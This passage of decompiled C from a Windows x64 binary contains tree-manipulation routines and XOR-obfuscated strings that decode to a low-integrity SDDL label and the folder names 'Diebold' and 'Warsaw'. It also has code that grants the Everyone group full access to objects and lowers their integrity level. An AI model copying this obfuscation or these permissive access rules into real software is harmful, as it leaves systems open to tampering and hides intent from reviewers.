        if ( *(_BYTE *)(*(_QWORD *)v18 + 24i64) != 1 || *(_BYTE *)(*((_QWORD *)v18 + 2) + 24i64) != 1 )
        {
          if ( *(_BYTE *)(*((_QWORD *)v18 + 2) + 24i64) == 1 )
          {
            *(_BYTE *)(*(_QWORD *)v18 + 24i64) = 1;
            v18[24] = 0;
            sub_14000C800((__int64)v5, v18);
            v18 = *(_BYTE **)(v10 + 16);
          }
          v18[24] = *(_BYTE *)(v10 + 24);
          *(_BYTE *)(v10 + 24) = 1;
          *(_BYTE *)(*((_QWORD *)v18 + 2) + 24i64) = 1;
          sub_14001BF70((__int64)v5, v10);
          break;
        }
      }
      else
      {
        if ( !v18[24] )
        {
          v18[24] = 1;
          v21 = *(_BYTE **)v10;
          *(_BYTE *)(v10 + 24) = 0;
          *(_QWORD *)v10 = *((_QWORD *)v21 + 2);
          v22 = *((_QWORD *)v21 + 2);
          if ( !*(_BYTE *)(v22 + 25) )
            *(_QWORD *)(v22 + 8) = v10;
          *((_QWORD *)v21 + 1) = *(_QWORD *)(v10 + 8);
          if ( v10 == *(_QWORD *)(*v5 + 8i64) )
          {
            *(_QWORD *)(*v5 + 8i64) = v21;
          }
          else
          {
            v23 = *(_QWORD **)(v10 + 8);
            if ( v10 == v23[2] )
              v23[2] = v21;
            else
              *v23 = v21;
          }
          *((_QWORD *)v21 + 2) = v10;
          *(_QWORD *)(v10 + 8) = v21;
          v18 = *(_BYTE **)v10;
        }
        if ( v18[25] )
          goto LABEL_77;
        if ( *(_BYTE *)(*((_QWORD *)v18 + 2) + 24i64) != 1 || *(_BYTE *)(*(_QWORD *)v18 + 24i64) != 1 )
        {
          if ( *(_BYTE *)(*(_QWORD *)v18 + 24i64) == 1 )
          {
            *(_BYTE *)(*((_QWORD *)v18 + 2) + 24i64) = 1;
            v18[24] = 0;
            sub_14001BF70((__int64)v5, (__int64)v18);
            v18 = *(_BYTE **)v10;
          }
          v18[24] = *(_BYTE *)(v10 + 24);
          *(_BYTE *)(v10 + 24) = 1;
          *(_BYTE *)(*(_QWORD *)v18 + 24i64) = 1;
          sub_14000C800((__int64)v5, (_QWORD *)v10);
          break;
        }
      }
      v18[24] = 0;
LABEL_77:
      v9 = v10;
    }
    *(_BYTE *)(v9 + 24) = 1;
  }
  operator delete(v4);
  v24 = v5[1];
  if ( v24 )
    v5[1] = v24 - 1;
  *v3 = v26;
  return v3;
}

//----- (0000000140079840) ----------------------------------------------------
int *sub_140079840()
{
  HLOCAL v0; // rbx
  WCHAR *v2; // [rsp+58h] [rbp+7h]
  PACL NewAcl; // [rsp+60h] [rbp+Fh]
  struct _EXPLICIT_ACCESS_W pListOfExplicitEntries; // [rsp+68h] [rbp+17h]
  struct _SID_IDENTIFIER_AUTHORITY pIdentifierAuthority; // [rsp+98h] [rbp+47h]

  if ( !byte_1400DBEA0 )
  {
    byte_1400DBEA0 = 1;
    *(_DWORD *)pIdentifierAuthority.Value = 0;
    *(_WORD *)&pIdentifierAuthority.Value[4] = 256;
    v2 = 0i64;
    AllocateAndInitializeSid(&pIdentifierAuthority, 1u, 0, 0, 0, 0, 0, 0, 0, 0, (PSID *)&v2);
    *(_QWORD *)&pListOfExplicitEntries.grfInheritance = 0i64;
    *(_QWORD *)&pListOfExplicitEntries.Trustee.MultipleTrusteeOperation = 0i64;
    *(_QWORD *)&pListOfExplicitEntries.Trustee.TrusteeType = 0i64;
    pListOfExplicitEntries.Trustee.pMultipleTrustee = 0i64;
    pListOfExplicitEntries.grfAccessPermissions = 0x1FFFFF;
    pListOfExplicitEntries.Trustee.ptstrName = v2;
    *(_QWORD *)&pListOfExplicitEntries.grfAccessMode = 2i64;
    pListOfExplicitEntries.Trustee.TrusteeForm = 0;
    pListOfExplicitEntries.Trustee.TrusteeType = 5;
    NewAcl = 0i64;
    SetEntriesInAclW(1u, &pListOfExplicitEntries, 0i64, &NewAcl);
    v0 = LocalAlloc(0x40u, 0x28ui64);
    InitializeSecurityDescriptor(v0, 1u);
    SetSecurityDescriptorDacl(v0, 1, NewAcl, 0);
    qword_1400DBEB0 = (__int64)v0;
    dword_1400DBEB8 = 0;
    dword_1400DBEA8 = 24;
  }
  return &dword_1400DBEA8;
}
// 1400DBEA0: using guessed type char byte_1400DBEA0;
// 1400DBEA8: using guessed type int dword_1400DBEA8;
// 1400DBEB0: using guessed type __int64 qword_1400DBEB0;
// 1400DBEB8: using guessed type int dword_1400DBEB8;

//----- (0000000140079990) ----------------------------------------------------
char *sub_140079990()
{
  int v0; // er9
  int v1; // er10
  char v2; // r10
  char *result; // rax
  unsigned int v4; // ecx
  __int64 v5; // r9
  char v6; // r8
  char v7; // dl

  v0 = dword_1400DBE7C;
  if ( dword_1400DBE7C & 1 )
  {
    v2 = byte_1400DBE78;
  }
  else
  {
    v1 = 69069 * dword_1400DBE70 + 1234567;
    v0 = dword_1400DBE7C | 1;
    dword_1400DBE70 = v1;
    dword_1400DBE7C |= 1u;
    dword_1400DBE68 = HIWORD(dword_1400DBE68) + 36969 * (unsigned __int16)dword_1400DBE68;
    LOBYTE(v1) = (BYTE2(dword_1400DBE74) + 80 * dword_1400DBE74) ^ v1;
    dword_1400DBE74 = HIWORD(dword_1400DBE74) + 18000 * (unsigned __int16)dword_1400DBE74;
    v2 = (((unsigned int)dword_1400DBE6C >> 13) ^ 32 * dword_1400DBE6C ^ dword_1400DBE6C) + v1;
    dword_1400DBE6C ^= ((unsigned int)dword_1400DBE6C >> 13) ^ 32 * (dword_1400DBE6C ^ (dword_1400DBE6C << 12));
    byte_1400DBE78 = v2;
  }
  if ( !(v0 & 2) )
  {
    dword_1400DBE7C = v0 | 2;
    byte_1400DBE80[0] = v2 ^ 0x53;
    byte_1400DBE81 = (v2 - 1) ^ 0x3A;
    byte_1400DBE82 = (v2 - 2) ^ 0x28;
    byte_1400DBE83 = (v2 - 3) ^ 0x4D;
    byte_1400DBE84 = (v2 - 4) ^ 0x4C;
    byte_1400DBE85 = (v2 - 5) ^ 0x3B;
    byte_1400DBE86 = (v2 - 6) ^ 0x3B;
    byte_1400DBE87 = (v2 - 7) ^ 0x4E;
    byte_1400DBE88 = (v2 - 8) ^ 0x57;
    byte_1400DBE89 = (v2 - 9) ^ 0x3B;
    byte_1400DBE8A = (v2 - 10) ^ 0x3B;
    byte_1400DBE8B = (v2 - 11) ^ 0x3B;
    byte_1400DBE8C = (v2 - 12) ^ 0x4C;
    byte_1400DBE8D = (v2 - 13) ^ 0x57;
    byte_1400DBE8E = (v2 - 14) ^ 0x29;
  }
  result = byte_1400DBE90;
  if ( !byte_1400DBE90[0] )
  {
    v4 = 0;
    v5 = 0i64;
    do
    {
      v6 = byte_1400DBE80[v5++];
      v7 = v2 - v4++;
      byte_1400DBE90[v5 - 1] = v7 ^ v6;
    }
    while ( v4 < 0xF );
  }
  return result;
}
// 1400DBE68: using guessed type int dword_1400DBE68;
// 1400DBE6C: using guessed type int dword_1400DBE6C;
// 1400DBE70: using guessed type int dword_1400DBE70;
// 1400DBE74: using guessed type int dword_1400DBE74;
// 1400DBE78: using guessed type char byte_1400DBE78;
// 1400DBE7C: using guessed type int dword_1400DBE7C;
// 1400DBE81: using guessed type char byte_1400DBE81;
// 1400DBE82: using guessed type char byte_1400DBE82;
// 1400DBE83: using guessed type char byte_1400DBE83;
// 1400DBE84: using guessed type char byte_1400DBE84;
// 1400DBE85: using guessed type char byte_1400DBE85;
// 1400DBE86: using guessed type char byte_1400DBE86;
// 1400DBE87: using guessed type char byte_1400DBE87;
// 1400DBE88: using guessed type char byte_1400DBE88;
// 1400DBE89: using guessed type char byte_1400DBE89;
// 1400DBE8A: using guessed type char byte_1400DBE8A;
// 1400DBE8B: using guessed type char byte_1400DBE8B;
// 1400DBE8C: using guessed type char byte_1400DBE8C;
// 1400DBE8D: using guessed type char byte_1400DBE8D;
// 1400DBE8E: using guessed type char byte_1400DBE8E;

//----- (0000000140079B40) ----------------------------------------------------
_BOOL8 __fastcall sub_140079B40(HANDLE handle)
{
  HANDLE v1; // rdi
  bool v2; // bl
  char *v3; // rax
  PACL pSacl; // [rsp+40h] [rbp-28h]
  BOOL bSaclDefaulted; // [rsp+78h] [rbp+10h]
  BOOL bSaclPresent; // [rsp+80h] [rbp+18h]
  PSECURITY_DESCRIPTOR SecurityDescriptor; // [rsp+88h] [rbp+20h]

  v1 = handle;
  v2 = 0;
  SecurityDescriptor = 0i64;
  pSacl = 0i64;
  bSaclPresent = 0;
  bSaclDefaulted = 0;
  v3 = sub_140079990();
  if ( ConvertStringSecurityDescriptorToSecurityDescriptorA(v3, 1u, &SecurityDescriptor, 0i64)
    && GetSecurityDescriptorSacl(SecurityDescriptor, &bSaclPresent, &pSacl, &bSaclDefaulted) )
  {
    v2 = SetSecurityInfo(v1, SE_KERNEL_OBJECT, 0x10u, 0i64, 0i64, 0i64, pSacl) == 0;
  }
  if ( SecurityDescriptor )
    LocalFree(SecurityDescriptor);
  return v2;
}

//----- (0000000140079BF0) ----------------------------------------------------
_BOOL8 __fastcall sub_140079BF0(LPSTR pObjectName)
{
  LPSTR v1; // rbx
  bool v2; // di
  char *v3; // rax
  PACL pSacl; // [rsp+40h] [rbp-28h]
  BOOL bSaclDefaulted; // [rsp+78h] [rbp+10h]
  BOOL bSaclPresent; // [rsp+80h] [rbp+18h]
  PSECURITY_DESCRIPTOR SecurityDescriptor; // [rsp+88h] [rbp+20h]

  v1 = pObjectName;
  v2 = 0;
  SecurityDescriptor = 0i64;
  pSacl = 0i64;
  bSaclPresent = 0;
  bSaclDefaulted = 0;
  v3 = sub_140079990();
  if ( ConvertStringSecurityDescriptorToSecurityDescriptorA(v3, 1u, &SecurityDescriptor, 0i64)
    && GetSecurityDescriptorSacl(SecurityDescriptor, &bSaclPresent, &pSacl, &bSaclDefaulted) )
  {
    if ( *((_QWORD *)v1 + 3) >= 0x10ui64 )
      v1 = *(LPSTR *)v1;
    v2 = SetNamedSecurityInfoA(v1, SE_KERNEL_OBJECT, 0x10u, 0i64, 0i64, 0i64, pSacl) == 0;
  }
  if ( SecurityDescriptor )
    LocalFree(SecurityDescriptor);
  return v2;
}

//----- (0000000140079CB0) ----------------------------------------------------
_QWORD *__fastcall sub_140079CB0(_QWORD *a1, _BYTE *a2)
{
  _QWORD *v2; // rsi
  size_t v3; // r8
  _WORD *v4; // rax
  __int64 v5; // rdx
  __int64 v6; // rcx
  __int64 v7; // rbp
  char *v8; // rdi
  void *v9; // rbx
  __int64 v10; // rax
  void *Dst; // [rsp+28h] [rbp-40h]
  __int64 v13; // [rsp+38h] [rbp-30h]
  unsigned __int64 v14; // [rsp+40h] [rbp-28h]

  v2 = a1;
  v3 = 0i64;
  a1[2] = 0i64;
  if ( a1[3] < 8ui64 )
    v4 = a1;
  else
    v4 = (_WORD *)*a1;
  *v4 = 0;
  v14 = 15i64;
  v13 = 0i64;
  LOBYTE(Dst) = 0;
  if ( *a2 )
  {
    v3 = -1i64;
    do
      ++v3;
    while ( a2[v3] );
  }
  sub_140004F20(&Dst, a2, v3);
  v7 = v13;
  if ( v13 )
  {
    v8 = (char *)&Dst;
    if ( v14 >= 0x10 )
      v8 = (char *)Dst;
    v9 = &Dst;
    if ( v14 >= 0x10 )
      v9 = Dst;
    v10 = sub_140031970(v6, v5);
    sub_140030C60(v9, &v8[v7], v2, v10);
  }
  if ( v14 >= 0x10 )
    operator delete(Dst);
  return v2;
}
// 140031970: using guessed type __int64 __cdecl sub_140031970(_QWORD, _QWORD);

//----- (0000000140079DA0) ----------------------------------------------------
void __fastcall sub_140079DA0(__int64 a1)
{
  __int64 v1; // rbx

  v1 = a1;
  if ( *(_QWORD *)(a1 + 248) >= 8ui64 )
    operator delete(*(void **)(a1 + 224));
  *(_QWORD *)(v1 + 248) = 7i64;
  *(_QWORD *)(v1 + 240) = 0i64;
  *(_WORD *)(v1 + 224) = 0;
  if ( *(_QWORD *)(v1 + 216) >= 8ui64 )
    operator delete(*(void **)(v1 + 192));
  *(_QWORD *)(v1 + 216) = 7i64;
  *(_QWORD *)(v1 + 208) = 0i64;
  *(_WORD *)(v1 + 192) = 0;
  if ( *(_QWORD *)(v1 + 184) >= 8ui64 )
    operator delete(*(void **)(v1 + 160));
  *(_QWORD *)(v1 + 184) = 7i64;
  *(_QWORD *)(v1 + 176) = 0i64;
  *(_WORD *)(v1 + 160) = 0;
  if ( *(_QWORD *)(v1 + 152) >= 8ui64 )
    operator delete(*(void **)(v1 + 128));
  *(_QWORD *)(v1 + 152) = 7i64;
  *(_QWORD *)(v1 + 144) = 0i64;
  *(_WORD *)(v1 + 128) = 0;
  if ( *(_QWORD *)(v1 + 120) >= 8ui64 )
    operator delete(*(void **)(v1 + 96));
  *(_QWORD *)(v1 + 120) = 7i64;
  *(_QWORD *)(v1 + 112) = 0i64;
  *(_WORD *)(v1 + 96) = 0;
  if ( *(_QWORD *)(v1 + 88) >= 8ui64 )
    operator delete(*(void **)(v1 + 64));
  *(_QWORD *)(v1 + 88) = 7i64;
  *(_QWORD *)(v1 + 80) = 0i64;
  *(_WORD *)(v1 + 64) = 0;
  if ( *(_QWORD *)(v1 + 56) >= 8ui64 )
    operator delete(*(void **)(v1 + 32));
  *(_QWORD *)(v1 + 56) = 7i64;
  *(_QWORD *)(v1 + 48) = 0i64;
  *(_WORD *)(v1 + 32) = 0;
  if ( *(_QWORD *)(v1 + 24) >= 8ui64 )
    operator delete(*(void **)v1);
  *(_QWORD *)(v1 + 24) = 7i64;
  *(_QWORD *)(v1 + 16) = 0i64;
  *(_WORD *)v1 = 0;
}

//----- (0000000140079F00) ----------------------------------------------------
__int64 __fastcall sub_140079F00(int csidl, void *Src)
{
  void **v2; // rsi
  int v3; // ebx
  unsigned __int64 v4; // r8
  __int64 v5; // rcx
  _QWORD *v6; // rax
  _QWORD *v7; // rbx
  unsigned __int64 v8; // rdx
  _QWORD *v9; // rcx
  _QWORD *v10; // rax
  _QWORD *v11; // rcx
  __int64 v12; // rdi
  unsigned __int8 v13; // bl
  int v15; // [rsp+30h] [rbp-D0h]
  __int64 v16; // [rsp+38h] [rbp-C8h]
  char v17; // [rsp+40h] [rbp-C0h]
  __int64 v18; // [rsp+48h] [rbp-B8h]
  void *Srca; // [rsp+50h] [rbp-B0h]
  __int64 v20; // [rsp+60h] [rbp-A0h]
  unsigned __int64 v21; // [rsp+68h] [rbp-98h]
  void *v22; // [rsp+70h] [rbp-90h]
  unsigned __int64 v23; // [rsp+88h] [rbp-78h]
  __int16 Dst[264]; // [rsp+90h] [rbp-70h]

  v18 = -2i64;
  v2 = (void **)Src;
  v3 = csidl;
  v21 = 7i64;
  v20 = 0i64;
  LOWORD(Srca) = 0;
  memset(Dst, 0, 0x208ui64);
  if ( SHGetFolderPathW(0i64, v3, 0i64, 0, (LPWSTR)Dst) )
  {
    v13 = 0;
  }
  else
  {
    if ( Dst[0] )
    {
      v4 = -1i64;
      do
        ++v4;
      while ( Dst[v4] );
    }
    else
    {
      v4 = 0i64;
    }
    sub_14002E600(&Srca, Dst, v4);
    v15 = 0;
    v16 = sub_140030C00(v5);
    v6 = sub_14007A230(&v22);
    v7 = v6;
    v8 = v6[3];
    if ( v8 < 0x10 )
      v9 = v6;
    else
      v9 = (_QWORD *)*v6;
    v10 = (_QWORD *)((char *)v9 + v6[2]);
    if ( v8 < 0x10 )
      v11 = v7;
    else
      v11 = (_QWORD *)*v7;
    if ( v11 != v10 )
    {
      v12 = sub_140032930(&Srca);
      sub_140003C30(v7, &Srca);
      if ( v12 )
        sub_1400329A0(&Srca, v12);
    }
    if ( v23 >= 0x10 )
      operator delete(v22);
    if ( v2 != &Srca )
      sub_140005050(v2, &Srca, 0i64, 0xFFFFFFFFFFFFFFFFui64);
    if ( *sub_1400348D0(&v17, &Srca, (__int64)&v15) > 1u && *sub_1400348D0(&v17, &Srca, (__int64)&v15) != 3 )
      sub_1400345E0((LPCWSTR)&Srca, (__int64)&v15);
    if ( *sub_1400348D0(&v17, &Srca, (__int64)&v15) <= 1u )
      sub_1400337B0(&Srca, &v15);
    v13 = 1;
  }
  if ( v21 >= 8 )
    operator delete(Srca);
  return v13;
}
// 140030C00: using guessed type __int64 __cdecl sub_140030C00(_QWORD);
// 1400337B0: using guessed type __int64 __fastcall sub_1400337B0(_QWORD, _QWORD);
// 140079F00: using guessed type __int16 Dst[264];

//----- (000000014007A100) ----------------------------------------------------
_QWORD *__fastcall sub_14007A100(_QWORD *a1)
{
  _QWORD *v1; // rbx
  char *v2; // rax
  CHAR Filename; // [rsp+20h] [rbp-128h]
  char Dst; // [rsp+21h] [rbp-127h]

  v1 = a1;
  if ( !a1[2] )
  {
    Filename = 0;
    memset(&Dst, 0, 0x103ui64);
    if ( GetModuleFileNameA(0i64, &Filename, 0x103u) )
    {
      v2 = strrchr(&Filename, 92);
      if ( v2 )
        *v2 = 0;
      sub_140079CB0(v1, &Filename);
    }
  }
  return v1;
}

//----- (000000014007A1A0) ----------------------------------------------------
_QWORD *sub_14007A1A0()
{
  return sub_14007A100(&unk_1400D80E0);
}

//----- (000000014007A230) ----------------------------------------------------
_QWORD *__fastcall sub_14007A230(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DBED8;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DBED8 & 1 )
  {
    v5 = byte_1400DBED4;
  }
  else
  {
    v4 = 69069 * dword_1400DBECC + 1234567;
    v1 = dword_1400DBED8 | 1;
    dword_1400DBECC = v4;
    dword_1400DBED8 |= 1u;
    dword_1400DBEC4 = HIWORD(dword_1400DBEC4) + 36969 * (unsigned __int16)dword_1400DBEC4;
    LOBYTE(v4) = (BYTE2(dword_1400DBED0) + 80 * dword_1400DBED0) ^ v4;
    dword_1400DBED0 = HIWORD(dword_1400DBED0) + 18000 * (unsigned __int16)dword_1400DBED0;
    v5 = (((unsigned int)dword_1400DBEC8 >> 13) ^ 32 * dword_1400DBEC8 ^ dword_1400DBEC8) + v4;
    dword_1400DBEC8 ^= ((unsigned int)dword_1400DBEC8 >> 13) ^ 32 * (dword_1400DBEC8 ^ (dword_1400DBEC8 << 12));
    byte_1400DBED4 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DBED8 = v1 | 2;
    byte_1400DBEDC[0] = v5 ^ 0x44;
    byte_1400DBEDD = (v5 - 1) ^ 0x69;
    byte_1400DBEDE = (v5 - 2) ^ 0x65;
    byte_1400DBEDF = (v5 - 3) ^ 0x62;
    byte_1400DBEE0 = (v5 - 4) ^ 0x6F;
    byte_1400DBEE1 = (v5 - 5) ^ 0x6C;
    byte_1400DBEE2 = (v5 - 6) ^ 0x64;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 7ui64 )
  {
    sub_140004790(Src, 7ui64, 0i64);
    v5 = byte_1400DBED4;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *(_DWORD *)v6 = 0;
  *((_WORD *)v6 + 2) = 0;
  *((_BYTE *)v6 + 6) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 7i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 7) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400DBEDC[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 7 );
  return v3;
}
// 1400DBEC4: using guessed type int dword_1400DBEC4;
// 1400DBEC8: using guessed type int dword_1400DBEC8;
// 1400DBECC: using guessed type int dword_1400DBECC;
// 1400DBED0: using guessed type int dword_1400DBED0;
// 1400DBED4: using guessed type char byte_1400DBED4;
// 1400DBED8: using guessed type int dword_1400DBED8;
// 1400DBEDD: using guessed type char byte_1400DBEDD;
// 1400DBEDE: using guessed type char byte_1400DBEDE;
// 1400DBEDF: using guessed type char byte_1400DBEDF;
// 1400DBEE0: using guessed type char byte_1400DBEE0;
// 1400DBEE1: using guessed type char byte_1400DBEE1;
// 1400DBEE2: using guessed type char byte_1400DBEE2;

//----- (000000014007A400) ----------------------------------------------------
_QWORD *__fastcall sub_14007A400(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DBEE4;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DBEE4 & 1 )
  {
    v5 = byte_1400DBEE3;
  }
  else
  {
    v4 = 69069 * dword_1400DBECC + 1234567;
    v1 = dword_1400DBEE4 | 1;
    dword_1400DBECC = v4;
    dword_1400DBEE4 |= 1u;
    dword_1400DBEC4 = HIWORD(dword_1400DBEC4) + 36969 * (unsigned __int16)dword_1400DBEC4;
    LOBYTE(v4) = (BYTE2(dword_1400DBED0) + 80 * dword_1400DBED0) ^ v4;
    dword_1400DBED0 = HIWORD(dword_1400DBED0) + 18000 * (unsigned __int16)dword_1400DBED0;
    v5 = (((unsigned int)dword_1400DBEC8 >> 13) ^ 32 * dword_1400DBEC8 ^ dword_1400DBEC8) + v4;
    dword_1400DBEC8 ^= ((unsigned int)dword_1400DBEC8 >> 13) ^ 32 * (dword_1400DBEC8 ^ (dword_1400DBEC8 << 12));
    byte_1400DBEE3 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DBEE4 = v1 | 2;
    byte_1400DBEE8[0] = v5 ^ 0x57;
    byte_1400DBEE9 = (v5 - 1) ^ 0x61;
    byte_1400DBEEA = (v5 - 2) ^ 0x72;
    byte_1400DBEEB = (v5 - 3) ^ 0x73;
    byte_1400DBEEC = (v5 - 4) ^ 0x61;
    byte_1400DBEED = (v5 - 5) ^ 0x77;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 6ui64 )
  {
    sub_140004790(Src, 6ui64, 0i64);
    v5 = byte_1400DBEE3;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *(_DWORD *)v6 = 0;
  *((_WORD *)v6 + 2) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 6i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 6) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400DBEE8[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 6 );
  return v3;
}
// 1400DBEC4: using guessed type int dword_1400DBEC4;
// 1400DBEC8: using guessed type int dword_1400DBEC8;
// 1400DBECC: using guessed type int dword_1400DBECC;
// 1400DBED0: using guessed type int dword_1400DBED0;
// 1400DBEE3: using guessed type char byte_1400DBEE3;
// 1400DBEE4: using guessed type int dword_1400DBEE4;
// 1400DBEE9: using guessed type char byte_1400DBEE9;
// 1400DBEEA: using guessed type char byte_1400DBEEA;
// 1400DBEEB: using guessed type char byte_1400DBEEB;
// 1400DBEEC: using guessed type char byte_1400DBEEC;
// 1400DBEED: using guessed type char byte_1400DBEED;

//----- (000000014007A5C0) ----------------------------------------------------
void __fastcall sub_14007A5C0(int a1, void **a2)
{
  void **v2; // rsi
  _QWORD *v3; // rax
  _QWORD *v4; // rbx
  unsigned __int64 v5; // rdx
  _QWORD *v6; // rcx
  _QWORD *v7; // rax
  _QWORD *v8; // rcx
  __int64 v9; // rdi
  int v10; // [rsp+20h] [rbp-88h]
  __int64 v11; // [rsp+28h] [rbp-80h]
  __int64 v12; // [rsp+30h] [rbp-78h]
  char v13; // [rsp+38h] [rbp-70h]
  void *v14; // [rsp+40h] [rbp-68h]
  __int64 v15; // [rsp+50h] [rbp-58h]
  unsigned __int64 v16; // [rsp+58h] [rbp-50h]
  void *Src; // [rsp+60h] [rbp-48h]
  unsigned __int64 v18; // [rsp+78h] [rbp-30h]

  v12 = -2i64;
  v2 = a2;
  v16 = 7i64;
  v15 = 0i64;
  LOWORD(v14) = 0;
  if ( (unsigned __int8)sub_140079F00(a1, &v14) )
  {
    v3 = sub_14007A400(&Src);
    v4 = v3;
    v5 = v3[3];
    if ( v5 < 0x10 )
      v6 = v3;
    else
      v6 = (_QWORD *)*v3;
    v7 = (_QWORD *)((char *)v6 + v3[2]);
    if ( v5 < 0x10 )
      v8 = v4;
    else
      v8 = (_QWORD *)*v4;
    if ( v8 != v7 )
    {
      v9 = sub_140032930(&v14);
      sub_140003C30(v4, &v14);
      if ( v9 )
        sub_1400329A0(&v14, v9);
    }
    if ( v18 >= 0x10 )
      operator delete(Src);
    if ( v2 != &v14 )
      sub_140005050(v2, &v14, 0i64, 0xFFFFFFFFFFFFFFFFui64);
    v10 = 0;
    v11 = sub_140030C00(v8);
    if ( *sub_1400348D0(&v13, &v14, (__int64)&v10) <= 1u )
      sub_1400337B0(&v14, &v10);
  }
  if ( v16 >= 8 )
    operator delete(v14);
}
// 140030C00: using guessed type __int64 __cdecl sub_140030C00(_QWORD);
// 1400337B0: using guessed type __int64 __fastcall sub_1400337B0(_QWORD, _QWORD);

//----- (000000014007A720) ----------------------------------------------------
__int64 __fastcall sub_14007A720(__int64 a1, __int64 a2, _BYTE *a3, char a4)
{
  char v4; // bp
  _BYTE *v5; // r14
  __int64 v6; // rsi
  __int64 v7; // rdi
  _QWORD *v8; // rax
  _QWORD *v9; // rbx
  __int64 v10; // r14
  void (__fastcall ***v11)(_QWORD, signed __int64); // rcx
  void (__fastcall ***v12)(_QWORD, signed __int64); // rcx

  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  v8 = operator new(0x28ui64);
  v9 = v8;
  if ( v8 )
  {
    v8[1] = v6;
    *((_BYTE *)v8 + 16) = v4;
    *((_BYTE *)v8 + 17) = 0;
    v8[3] = 0i64;
    *v8 = &off_1400AABC0;
    *((_BYTE *)v8 + 32) = *v5;
  }
  else
  {
    v9 = 0i64;
  }
  v10 = *(_QWORD *)(v7 + 8);
  *(_QWORD *)(v7 + 8) = 0i64;
  v11 = (void (__fastcall ***)(_QWORD, signed __int64))v9[3];
  if ( v11 )
    (**v11)(v11, 1i64);
  v9[3] = v10;
  v12 = *(void (__fastcall ****)(_QWORD, signed __int64))(v7 + 8);
  if ( v12 )
    (**v12)(v12, 1i64);
  *(_QWORD *)(v7 + 8) = v9;
  *(_BYTE *)(v7 + 16) = v4;
  return v7;
}
// 1400AABC0: using guessed type __int64 (__fastcall *off_1400AABC0)(void *);

//----- (000000014007A7E0) ----------------------------------------------------
__int64 __fastcall sub_14007A7E0(__int64 a1, __int64 a2, _BYTE *a3, char a4)
{
  char v4; // bl
  _BYTE *v5; // rdi
  __int64 v6; // rsi
  __int64 v7; // rbp
  __int64 v8; // rax
  __int64 v9; // rax
  __int64 v11; // [rsp+30h] [rbp-28h]
  void (__fastcall ***v12)(_QWORD, signed __int64); // [rsp+38h] [rbp-20h]

  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  v8 = sub_140053D40((__int64)&v11);
  v9 = sub_14007A720(v8, v6, v5, v4);
  sub_140053CE0(v7, v9);
  if ( v12 )
    (**v12)(v12, 1i64);
  return v7;
}

//----- (000000014007A870) ----------------------------------------------------
_QWORD *__fastcall sub_14007A870(__int64 a1, __int64 a2, unsigned __int64 a3, __int64 a4)
{
  __int64 v4; // rbx
  unsigned __int64 v5; // rbp
  __int64 v6; // rsi
  _QWORD *v7; // r14
  _QWORD *v8; // rdi
  __int64 v9; // rax
  __int64 v10; // rax
  char v12; // [rsp+20h] [rbp-88h]
  __int64 v13; // [rsp+28h] [rbp-80h]
  __int64 v14; // [rsp+30h] [rbp-78h]
  unsigned __int64 v15; // [rsp+40h] [rbp-68h]
  void *Memory; // [rsp+48h] [rbp-60h]
  __int64 v17; // [rsp+50h] [rbp-58h]
  __int64 v18; // [rsp+58h] [rbp-50h]
  char v19; // [rsp+60h] [rbp-48h]
  void (__fastcall ***v20)(_QWORD, signed __int64); // [rsp+68h] [rbp-40h]

  v18 = -2i64;
  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = (_QWORD *)a1;
  v17 = a1;
  v8 = (_QWORD *)(a1 + 104);
  sub_14007ADD0(a1 + 104);
  *v8 = &off_1400B04E0;
  v8[1] = off_1400B0558;
  sub_14007AA90(v7);
  *v7 = &off_1400B0968;
  v7[1] = &off_1400B0A08;
  v7[6] = off_1400B0A78;
  v7[2] = v8;
  v9 = (*(unsigned int (**)(void))(v8[1] + 32i64))();
  v15 = 0i64;
  Memory = 0i64;
  v13 = v4;
  v14 = v9;
  v12 = 0;
  v10 = sub_140036C20((__int64)&v19, (__int64)&unk_1400A8AA0, (__int64)&v12, 1);
  sub_140039240((__int64)v7, v6, v5, v10);
  if ( v20 )
    (**v20)(v20, 1i64);
  memset(Memory, 0, v15);
  free(Memory);
  return v7;
}
// 1400B04E0: using guessed type __int64 (__fastcall *off_1400B04E0)(void *);
// 1400B0558: using guessed type __int64 (__fastcall *off_1400B0558[2])();
